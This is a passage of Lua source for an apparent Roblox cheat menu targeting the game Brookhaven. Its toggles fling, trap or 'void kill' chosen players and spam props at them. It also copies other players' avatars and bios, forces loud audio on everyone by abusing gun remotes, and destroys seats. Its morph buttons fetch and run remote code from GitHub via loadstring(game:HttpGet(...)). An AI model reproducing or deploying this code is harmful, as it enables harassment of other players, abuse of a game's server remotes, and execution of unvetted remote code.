                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "PRISON PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("PRISON PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                activeConnections["PRISON PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        hrp.CFrame = CFrame.new(55, 34, 631)
                        ClearConnection("PRISON PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "VOID KILL PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("VOID KILL PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                activeConnections["VOID KILL PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        hrp.CFrame = CFrame.new(0, -900, 0)
                        ClearConnection("VOID KILL PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "FLING BOAT",
        Default = false,
        Callback = function(state)
            ClearConnection("FLING BOAT")
            ClearConnection("FLING BOAT_CONN")

            if state then
                activeConnections["FLING BOAT"] = task.spawn(function()
                    local boat = SpawnAndSitBoat()
                    local angleOrbit = 0
                    local rotX, rotY, rotZ = 0, 0, 0

                    local conn
                    conn = RunService.Heartbeat:Connect(function()
                        local target = FindTarget(selectedPlayerName)
                        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                        local lhum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                        local thrp = target.Character.HumanoidRootPart

                        if not hrp or not lhum then return end

                        if not lhum.Sit then
                            ClearConnection("FLING BOAT")
                            ClearConnection("FLING BOAT_CONN")
                            return
                        end

                        angleOrbit = angleOrbit + 0.35
                        rotX = rotX + 40
                        rotY = rotY + 55
                        rotZ = rotZ + 25

                        local offsetX = math.cos(angleOrbit) * 30
                        local offsetZ = math.sin(angleOrbit) * 30
                        local targetPos = thrp.Position + Vector3.new(offsetX, 15, offsetZ)

                        local targetPart = (boat and (boat.PrimaryPart or boat:FindFirstChild("Body") or boat:FindFirstChildOfClass("BasePart"))) or hrp

                        targetPart.AssemblyLinearVelocity = Vector3.new(50000, 50000, 50000)
                        targetPart.AssemblyAngularVelocity = Vector3.new(50000, 50000, 50000)
                        targetPart.CFrame = CFrame.new(targetPos) 
                            * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                    end)

                    activeConnections["FLING BOAT_CONN"] = conn
                end)
            else
                if LP.Character then
                    local lhum = LP.Character:FindFirstChildOfClass("Humanoid")
                    local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
                    if lhum then lhum.Sit = false end
                    if hrp then
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end
        end
    })

    TabTroll:AddToggle({
        Name = "PROP SPAM",
        Default = false,
        Callback = function(state)
            ClearConnection("PROP SPAM")
            if state then
                activeConnections["PROP SPAM"] = task.spawn(function()
                    while true do
                        local target = FindTarget(selectedPlayerName)
                        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                            local currentTarget = FindTarget(selectedPlayerName)
                            if currentTarget and currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") then
                                local playerPos = currentTarget.Character.HumanoidRootPart.Position
                                
                                local char = LP.Character
                                if char and char:FindFirstChild("PropMaker") and char.PropMaker:FindFirstChild("Tool_PropMake") then
                                    local argsProp = {
                                        [1] = workspace.Model.Wedge,
                                        [2] = playerPos
                                    }
                                    char.PropMaker.Tool_PropMake:FireServer(unpack(argsProp))
                                end
                            end
                        end
                        task.wait(0.8)
                    end
                end)
            end
        end
    })
end

-- ==========================================
-- TAB AVATAR
-- ==========================================
local TabAvatar = Window:MakeTab({"AVATAR", "shirt"})

-- ================= SERVICES =================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

local TargetName = nil

-- ================= TEXTBOX =================
TabAvatar:AddTextBox({
    Name = "TARGET NAME",
    Description = "Enter target player name",
    PlaceholderText = "Username or Display...",
    Callback = function(Value)
        TargetName = Value
    end
})

-- ================= FUNÇÃO PARA ACHAR PLAYER =================
local function FindTarget(name)
    name = name:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():find(name) or plr.DisplayName:lower():find(name) then
            return plr
        end
    end
    return nil
end

-- ================= COPY AVATAR =================
TabAvatar:AddButton({"COPY AVATAR", function()
    if not TargetName then return end

    local TPlayer = FindTarget(TargetName)
    if not TPlayer or not TPlayer.Character then return end

    local LP = Players.LocalPlayer
    local LChar = LP.Character
    if not LChar then return end

    local LHumanoid = LChar:FindFirstChildOfClass("Humanoid")
    local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not (LHumanoid and THumanoid) then return end

    -- RESET LOCAL
    local LDesc = LHumanoid:GetAppliedDescription()
    for _, acc in ipairs(LDesc:GetAccessories(true)) do
        if tonumber(acc.AssetId) then
            Remotes.Wear:InvokeServer(acc.AssetId)
            task.wait(0.2)
        end
    end
    for _, id in ipairs({LDesc.Shirt, LDesc.Pants, LDesc.Face}) do
        if tonumber(id) then
            Remotes.Wear:InvokeServer(id)
            task.wait(0.2)
        end
    end

    -- COPY TARGET
    local PDesc = THumanoid:GetAppliedDescription()
    Remotes.ChangeCharacterBody:InvokeServer({
        PDesc.Torso,
        PDesc.RightArm,
        PDesc.LeftArm,
        PDesc.RightLeg,
        PDesc.LeftLeg,
        PDesc.Head
    })

    task.wait(0.5)

    for _, id in ipairs({PDesc.Shirt, PDesc.Pants, PDesc.Face}) do
        if tonumber(id) then
            Remotes.Wear:InvokeServer(id)
            task.wait(0.3)
        end
    end

    for _, acc in ipairs(PDesc:GetAccessories(true)) do
        if tonumber(acc.AssetId) then
            Remotes.Wear:InvokeServer(acc.AssetId)
            task.wait(0.3)
        end
    end

    local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
    if SkinColor then
        Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
    end

    if tonumber(PDesc.IdleAnimation) then
        Remotes.Wear:InvokeServer(PDesc.IdleAnimation)
    end

    -- BIO / CORES
    local Bag = TPlayer:FindFirstChild("PlayersBag")
    if Bag then
        if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
            Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
        end
        if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
            Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
        end
        if Bag:FindFirstChild("RPNameColor") then
            Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
        end
        if Bag:FindFirstChild("RPBioColor") then
            Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
        end
    end
end})

-- ================= HSV RGB COMPLETO =================

local RBW_Name = false
local RBW_Bio = false
local RBW_Body = false
local RBW_Speed = 1

TabAvatar:AddSection({"HSV RGB"})

TabAvatar:AddToggle({
	Name = "NAME RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Name = v
	end
})

TabAvatar:AddToggle({
	Name = "BIO RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Bio = v
	end
})

TabAvatar:AddToggle({
	Name = "BODY RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Body = v
	end
})

TabAvatar:AddTextBox({
	Name = "RGB SPEED",
	Description = "Adjust rainbow cycle speed",
	PlaceholderText = "1",
	Callback = function(v)
		local n = tonumber(v)
		if n and n > 0 then
			RBW_Speed = n
		end
	end
})

task.spawn(function()
	local hue = 0

	while true do
		task.wait(0.05)

		if RBW_Body or RBW_Name or RBW_Bio then
			hue = (hue + 0.01 * RBW_Speed) % 1

			local color = Color3.fromHSV(hue, 1, 1)
			local brick = BrickColor.new(color)

			if RBW_Body then
				Remotes.ChangeBodyColor:FireServer(brick.Name)
			end

			if RBW_Name then
				game:GetService("ReplicatedStorage")
					.RE["1RPNam1eColo1r"]
					:FireServer("PickingRPNameColor", color)
			end

			if RBW_Bio then
				game:GetService("ReplicatedStorage")
					.RE["1RPNam1eColo1r"]
					:FireServer("PickingRPBioColor", color)
			end
		end
	end
end)

-- =========================================================
-- RED BLACK WHITE RGB
-- =========================================================
local RBW_Colors = {
	Color3.fromRGB(255, 0, 0),
	Color3.fromRGB(0, 0, 0),
	Color3.fromRGB(255, 255, 255)
}

local RBW_Name = false
local RBW_Bio = false
local RBW_Body = false
local RBW_Speed = 0.7

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local ColorRemote = RE:WaitForChild("1RPNam1eColo1r")

TabAvatar:AddSection({"RED BLACK RGB"})

TabAvatar:AddToggle({
	Name = "NAME RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Name = v end
})

TabAvatar:AddToggle({
	Name = "BIO RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Bio = v end
})

TabAvatar:AddToggle({
	Name = "BODY RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Body = v end
})

TabAvatar:AddTextBox({
	Name = "RGB SPEED (RBW)",
	Description = "Set the color shifting delay interval",
	PlaceholderText = tostring(RBW_Speed),
	Callback = function(v)
		local n = tonumber(v)
		if n and n > 0.05 then
			RBW_Speed = n
		end
	end
})

task.spawn(function()
	local i = 1
	while true do
		task.wait(RBW_Speed)
		
		if RBW_Name or RBW_Bio or RBW_Body then
			i = i % #RBW_Colors + 1
			local currentColor = RBW_Colors[i]
			
			-- Altera a cor do Nome no RP do Brookhaven
			if RBW_Name then
				pcall(function()
					ColorRemote:FireServer("PickingRPNameColor", currentColor)
				end)
			end
			
			-- Altera a cor da Bio no RP do Brookhaven
			if RBW_Bio then
				pcall(function()
					ColorRemote:FireServer("PickingRPBioColor", currentColor)
				end)
			end
			
			-- Altera a cor da skin do personagem
			if RBW_Body then
				pcall(function()
					local brick = BrickColor.new(currentColor)
					Remotes.ChangeBodyColor:FireServer(brick.Name)
				end)
			end
		end
	end
end)

-- ================= RP NAMES =================
local RoleplayNames = {
	{"ANONYMOUS"," ANONYMOUS "},
	{"PRO PLAYER"," PRO PLAYER "},
	{"ERROR 666"," ERROR 666 "},
	{"GHOST"," GHOST "},
	{"JOKER"," JOKER "},
	{"ADMIN"," ADMIN "},
	{"TUBERS 93"," TUBERS 93 "},
	{"RED BLACK MEMBER"," RED BLACK MEMBER "},
	{"RED BLACK COMMUNITY"," RED BLACK COMMUNITY "},
	{"ADMIN RED BLACK"}
}

local selectedRP = nil

TabAvatar:AddSection({"RP Names"})

TabAvatar:AddDropdown({
	Name = "SELECT RP NAME",
	Description = "Choose an identity",
	Options = (function()
		local list = {}
		for _, v in ipairs(RoleplayNames) do
			table.insert(list, v[1])
		end
		return list
	end)(),
	Default = RoleplayNames[1][1],
	Callback = function(value)
		for _, v in ipairs(RoleplayNames) do
			if v[1] == value then
				selectedRP = v[2]
			end
		end
	end
})

TabAvatar:AddButton({"APPLY RP NAME", function()
	if not selectedRP then return end
	game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayName", selectedRP)
end})

-- ================= CLOTHES =================
TabAvatar:AddSection({"Clothes"})

TabAvatar:AddButton({"RED BLACK COMMUNITY SHIRT", function()
	Remotes.WearShirt:InvokeServer(101480394255855)
end})

TabAvatar:AddButton({"RED BLACK COMMUNITY PANTS", function()
	Remotes.WearPants:InvokeServer(124684324540170)
end})

-- ================= ITENS =================
TabAvatar:AddSection({"Itens"})

TabAvatar:AddButton({"SCARY HEAD", function()
	Remotes.Wear:InvokeServer(14994946752)
end})

TabAvatar:AddButton({"SCARY BRO 1", function()
	Remotes.Wear:InvokeServer(98235263954323)
end})

TabAvatar:AddButton({"SCARY BRO 2", function()
	Remotes.Wear:InvokeServer(87859729921468)
end})

TabAvatar:AddSection({"Morphs"})

local SELECTED_MORPH = nil

TabAvatar:AddDropdown({
    Name = "SELECT MORPH",
    Description = "Choose a morph to transform into",
    Options = {
        "SCP 096",
        "SID",
        "WORM BRO",
        "TUNG TUNG TUNG SAHUR",
        "BIG GUY",
        "DOJE",
        "BROWN CHICKEN",
        "GIGA CHAD",
        "KAWASAKI",
        "MIKE WAZOWSKI",
        "MONKEY",
        "PIGEON"
    },
    Default = "",
    Callback = function(Value)
        SELECTED_MORPH = Value
    end
})

TabAvatar:AddButton({"EQUIP", function()
    if not SELECTED_MORPH then return end

    if SELECTED_MORPH == "SCP 096" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SCP%20096"))()

    elseif SELECTED_MORPH == "SID" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SID"))()

    elseif SELECTED_MORPH == "WORM BRO" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/WORM%20BRO"))()

    elseif SELECTED_MORPH == "TUNG TUNG TUNG SAHUR" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/TUNG%20TUNG%20TUNG%20SAHUR"))()

    elseif SELECTED_MORPH == "BIG GUY" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/BIG%20GUY"))()

    elseif SELECTED_MORPH == "DOJE" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/DOJE"))()

    elseif SELECTED_MORPH == "BROWN CHICKEN" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/GALINHA"))()

    elseif SELECTED_MORPH == "GIGA CHAD" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/GIGA%20CHAD"))()

    elseif SELECTED_MORPH == "KAWASAKI" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/KAVAZAKI"))()

    elseif SELECTED_MORPH == "MIKE WAZOWSKI" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/MAIKI"))()

    elseif SELECTED_MORPH == "MONKEY" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/MONKEY"))()

    elseif SELECTED_MORPH == "PIGEON" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/PINGEON"))()
    end
end})

-- ================= SPECIAL ITEMS =================
do
	local SectionSpecial = TabAvatar:AddSection({"Legs & Heads"})

	local function EquipItemDirect(ids)
		if not LP or not LP.Character or not Remotes then return end
		pcall(function()
			for _, id in ipairs(ids) do
				Remotes.Wear:InvokeServer(id)
				task.wait(0.15)
			end
		end)
	end

	-- ICE LEG
	TabAvatar:AddButton({"ICE LEG", function()
		EquipItemDirect({139572789})
	end})

	-- HEADLESS
	TabAvatar:AddButton({"HEADLESS", function()
		local headlessId = 15093053680
		if headlessId ~= 0 then
			EquipItemDirect({headlessId})
		end
	end})

	-- ZOMBIE LEG
	TabAvatar:AddButton({"ZOMBIE LEG", function()
		EquipItemDirect({86681341524412})
	end})
end

-- ================= ACCESSORIES =================
do
	local SectionAccessories = TabAvatar:AddSection({"ACCESSORIES"})

	local function EquipAccessory(ids)
		if not LP or not LP.Character or not Remotes then return end
		pcall(function()
			for _, id in ipairs(ids) do
				Remotes.Wear:InvokeServer(id)
				task.wait(0.15)
			end
		end)
	end

	-- DOMINUS FRIGIDUS
	TabAvatar:AddButton({"DOMINUS FRIGIDUS", function()
		EquipAccessory({48545806})
	end})

	-- DOMINUS PRAEFECTUS
	TabAvatar:AddButton({"DOMINUS PRAEFECTUS", function()
		EquipAccessory({527365852})
	end})

	-- DOMINUS MESSOR
	TabAvatar:AddButton({"DOMINUS MESSOR", function()
		EquipAccessory({64444871})
	end})

	-- DOMINUS VESPERTILIO
	TabAvatar:AddButton({"DOMINUS VESPERTILIO", function()
		EquipAccessory({96103379})
	end})

	-- DOMINUS REX
	TabAvatar:AddButton({"DOMINUS REX", function()
		EquipAccessory({250395631})
	end})

	-- DOMINUS EMPYREUS FVM
	TabAvatar:AddButton({"DOMINUS EMPYREUS FVM", function()
		EquipAccessory({151789690})
	end})

	-- DOMINUS INFERNUS
	TabAvatar:AddButton({"DOMINUS INFERNUS", function()
		EquipAccessory({31101391})
	end})

	-- PIRATE CAPTAIN HAT
	TabAvatar:AddButton({"PIRATE CAPTAIN HAT", function()
		EquipAccessory({1028859})
	end})

	-- P SINISTER
	TabAvatar:AddButton({"P SINISTER", function()
		EquipAccessory({17450053})
	end})

	-- RIDDLE SKULL
	TabAvatar:AddButton({"RIDDLE SKULL", function()
		EquipAccessory({4765718})
	end})

	-- MAD COW
	TabAvatar:AddButton({"MAD COW", function()
		EquipAccessory({14673292})
	end})

	-- CLOCKWORK FVM
	TabAvatar:AddButton({"CLOCKWORK FVM", function()
		EquipAccessory({232492903})
	end})

	-- THE EARTH
	TabAvatar:AddButton({"THE EARTH", function()
		EquipAccessory({10072631})
	end})
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local RE = ReplicatedStorage:WaitForChild("RE")

local SoundIdValue = ""
local SelectedDropdownAudio = ""

local LoopTextboxEnabled = false
local LoopDropdownEnabled = false
local AudioAllActive = false

local BoomboxRGBEnabled = false
local BoomboxRGBSpeed = 0.5

local PresetAudios = {
    ["GET OUT"] = "17580996350",
    ["WINDOWS NOTIF"] = "2389339814",
    ["LOUD"] = "108451658708095",
    ["DIE FORTNITE"] = "72536455880966",
    ["REAL LOUD"] = "131682359704129",
    ["LIE DETECTOR"] = "117916446144888",
    ["NUKE ALARM"] = "433848566",
    ["LOOP BEEP SOUND"] = "6486261822",
    ["SCARY SOUND"] = "6516011433",
    ["SCARY SREAM"] = "111272255398192",
    ["SUS SCREAM"] = "76571808089308",
    ["NECK HURTS"] = "90409807315293",
    ["CHIKEN SCREAM"] = "81891427788694",
    ["VDSMA CARLINHOS"] = "135212564271817"
}

local DropdownOptions = {
    "GET OUT",
    "WINDOWS NOTIF",
    "LOUD",
    "DIE FORTNITE",
    "REAL LOUD",
    "LIE DETECTOR",
    "NUKE ALARM",
    "LOOP BEEP SOUND",
    "SCARY SOUND",
    "SCARY SREAM",
    "SUS SCREAM",
    "NECK HURTS",
    "CHIKEN SCREAM",
    "VDSMA CARLINHOS"
}

local function playLocalClientSound(audioId)
    task.spawn(function()
        local character = LP.Character
        if not character then return end
        local head = character:FindFirstChild("Head")
        if not head then return end
        
        local cleanID = tostring(audioId):gsub("%D", "")
        
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. cleanID
        sound.Volume = 2
        sound.Parent = head
        sound:Play()
        
        sound.Ended:Connect(function()
            sound:Destroy()
        end)
        
        task.wait(10)
        if sound and sound.Parent then sound:Destroy() end
    end)
end

local function fireShotgunRemote(audioId)
    local character = LP.Character
    if not character then return end
    
    local shotgun = character:FindFirstChild("Shotgun") or LP.Backpack:FindFirstChild("Shotgun")
    if not shotgun then return end
    
    local handle = shotgun:FindFirstChild("Handle")
    local gunScript = shotgun:FindFirstChild("GunScript_Local")
    if not handle or not gunScript then return end
    
    local muzzle = gunScript:FindFirstChild("MuzzleEffect")
    local hitEffect = gunScript:FindFirstChild("HitEffect")
    if not muzzle or not hitEffect then return end

    local cleanID = tostring(audioId):gsub("%D", "")
    local targetAudioID = tonumber(cleanID)
    if not targetAudioID then return end

    local args = {
        workspace:WaitForChild("Model"):WaitForChild("MeshPart"),
        handle,
        vector.create(-2.700000047683716, 0.125, 0),
        vector.create(332.68603515625, 31, 400.6531982421875),
        muzzle,
        hitEffect,
        targetAudioID,
        140181997495870,
        { false },
        {
            25,
            vector.create(0.25, 0.25, 100),
            BrickColor.new(24),
            0.25,
            Enum.Material.SmoothPlastic,
            0.25
        },
        true,
        false
    }

    playLocalClientSound(targetAudioID)

    pcall(function()
        RE:WaitForChild("1Gu1n"):FireServer(unpack(args))
    end)
end

local function runAudioAllSystem(audioIdToPlay)
    if AudioAllActive then return end
    local character = LP.Character
    if not character then return end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    AudioAllActive = true
    local originalCFrame = rootPart.CFrame

    local disabledSeats = {}
    for _, seat in ipairs(workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            if seat.Disabled == false then
                seat.Disabled = true
                table.insert(disabledSeats, seat)
            end
        end
    end

    local noclipConnection
    noclipConnection = RunService.Stepped:Connect(function()
        if LP.Character then
            for _, part in ipairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)

    local targets = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            table.insert(targets, p)
        end
    end

    for _, target in ipairs(targets) do
        local targetChar = target.Character
        local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        
        if targetRoot then
            fireShotgunRemote(audioIdToPlay)

            local startTime = os.clock()
            while os.clock() - startTime < 1 do
                if targetRoot and rootPart and LP.Character then
                    rootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 2)
                end
                RunService.Heartbeat:Wait()
            end
        end
    end

    if noclipConnection then noclipConnection:Disconnect() end
    
    for _, seat in ipairs(disabledSeats) do
        if seat and seat.Parent then
            seat.Disabled = false
        end
    end

    if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
        LP.Character.HumanoidRootPart.CFrame = originalCFrame
    end
    
    AudioAllActive = false
end

task.spawn(function()
    while true do
        task.wait(0.1)
        if LoopTextboxEnabled and SoundIdValue ~= "" then
            fireShotgunRemote(SoundIdValue)
            task.wait(0.4)
        end
        if LoopDropdownEnabled and SelectedDropdownAudio ~= "" then
            local id = PresetAudios[SelectedDropdownAudio]
            if id then
                fireShotgunRemote(id)
                task.wait(0.4)
            end
        end
    end
end)

local BoomboxColors = {
    Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255),
    Color3.fromRGB(255, 165, 0), Color3.fromRGB(128, 0, 128), Color3.fromRGB(255, 20, 147),
    Color3.fromRGB(139, 69, 19), Color3.fromRGB(75, 0, 130), Color3.fromRGB(0, 128, 128),
    Color3.fromRGB(192, 192, 192), Color3.fromRGB(255, 255, 255)
}

task.spawn(function()
    while true do
        task.wait(BoomboxRGBSpeed)
        if BoomboxRGBEnabled then
            local color = BoomboxColors[math.random(#BoomboxColors)]
            pcall(function()
                LP:WaitForChild("PlayerGui")
                    :WaitForChild("ToolGui")
                    :WaitForChild("ToolSettings")
                    :WaitForChild("Settings")
                    :WaitForChild("PropsColor")
                    :WaitForChild("SetColor")
                    :FireServer(color)
            end)
        end
    end
end)

local TabSound = Window:MakeTab({"SOUND FE", "volume-2"})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local SoundIdValue = ""
local SelectedDropdownAudio = "GET OUT"

local LoopTextboxEnabled = false
local LoopDropdownEnabled = false

local TextboxCooldownValue = 0.2
local DropdownCooldownValue = 0.2

local function fireSniperRemote(audioId)
    local character = LocalPlayer.Character
    if not character then return end
    
    local sniper = character:FindFirstChild("Sniper")
    if not sniper then return end

    local handle = sniper:FindFirstChild("Handle")
    local gunScript = sniper:FindFirstChild("GunScript_Local")
    
    if handle and gunScript then
        local muzzleEffect = gunScript:FindFirstChild("MuzzleEffect")
        local hitEffect = gunScript:FindFirstChild("HitEffect")
        
        local cleanAudioId = tonumber(audioId) or audioId
        
        local args = {
            workspace:WaitForChild("Model"):WaitForChild("001_SpawnColor"):WaitForChild("Color2"),
            handle,
            Vector3.new(0, 0.42500001192092896, -3.299999952316284),
            Vector3.new(-3.630251884460449, 0.40000152587890625, -10.42583179473877),
            muzzleEffect,
            hitEffect,
            cleanAudioId,
            140181997495870,
            { false },
            {
                25,
                Vector3.new(0.25, 0.25, 100),
                BrickColor.new(24),
                0.25,
                Enum.Material.SmoothPlastic,
                0.25
            },
            true,
            false
        }
        
        pcall(function()
            RE:WaitForChild("1Gu1n"):FireServer(unpack(args))
        end)
        
        task.spawn(function()
            pcall(function()
                local localSound = Instance.new("Sound")
                localSound.SoundId = "rbxassetid://" .. tostring(audioId)
                localSound.Volume = 5
                localSound.Parent = handle
                localSound:Play()
                task.wait(2)
                localSound:Destroy()
            end)
        end)
    end
end

local function runAudioAllSystem(audioId)
    if not audioId or audioId == "" then return end
    
    local character = LocalPlayer.Character
    if not character then return end
    
    local originalCFrame = character:GetPivot()
    
    pcall(function()
        for _, desc in ipairs(workspace:GetDescendants()) do
            if desc:IsA("Seat") or desc:IsA("VehicleSeat") then
                desc:Destroy()
            end
        end
    end)
    
    local noclipConnection
    noclipConnection = RunService.Stepped:Connect(function()
        if character then
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
    
    task.spawn(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = player.Character.HumanoidRootPart
                local startTime = os.clock()
                
                fireSniperRemote(audioId)
                
                while os.clock() - startTime < 1.5 and targetRoot and targetRoot.Parent and character and character.Parent do
                    pcall(function()
                        character:PivotTo(targetRoot.CFrame)
                    end)
                    RunService.Heartbeat:Wait()
                end
            end
        end
        
        if noclipConnection then noclipConnection:Disconnect() end
        if character then
            character:PivotTo(originalCFrame)
        end
    end)
end

TabSound:AddSection({"Required Tools"})

TabSound:AddButton({"GET SNIPER", function()
    task.spawn(function()
        pcall(function()
            RE:WaitForChild("1Too1l"):InvokeServer("PickingTools", "Sniper")
        end)
    end)
end})

TabSound:AddButton({"GET BOOMBOX", function()
    task.spawn(function()
        pcall(function()
            RE:WaitForChild("1Too1l"):InvokeServer("PickingTools", "Boombox")
        end)
    end)
end})

TabSound:AddSection({"Boombox / FE Sound"})

TabSound:AddTextBox({
    Name = "SOUND ID",
    Description = "Enter audio asset ID",
    PlaceholderText = "Audio ID...",
    Callback = function(value)
        SoundIdValue = tostring(value)
    end
})

TabSound:AddButton({"PLAY SOUND", function()
    if SoundIdValue == "" then return end

    task.spawn(function()
        pcall(function()
            RE:WaitForChild("PlayerToolEvent"):FireServer(
                "ToolMusicText",
                SoundIdValue,
                nil,
                true
            )
        end)
    end)
end})

TabSound:AddToggle({
    Name = "RGB BOOMBOX",
    Default = false,
    Callback = function(state)
        BoomboxRGBEnabled = state
    end
})

TabSound:AddTextBox({
    Name = "RGB SPEED (SECONDS)",
    Description = "Adjust color changing interval",
    PlaceholderText = "0.5",
    Callback = function(value)
        local v = tonumber(value)
        if v and v > 0.05 then
            BoomboxRGBSpeed = v
        end
    end
})

TabSound:AddParagraph({"WARNING", "To play sounds using the Boombox, you must own the Sound Game Pass. You can also temporarily access it by watching an advertisement, which grants the Sound Game Pass for 10 minutes."})

TabSound:AddSection({"Custom FE Sound"})

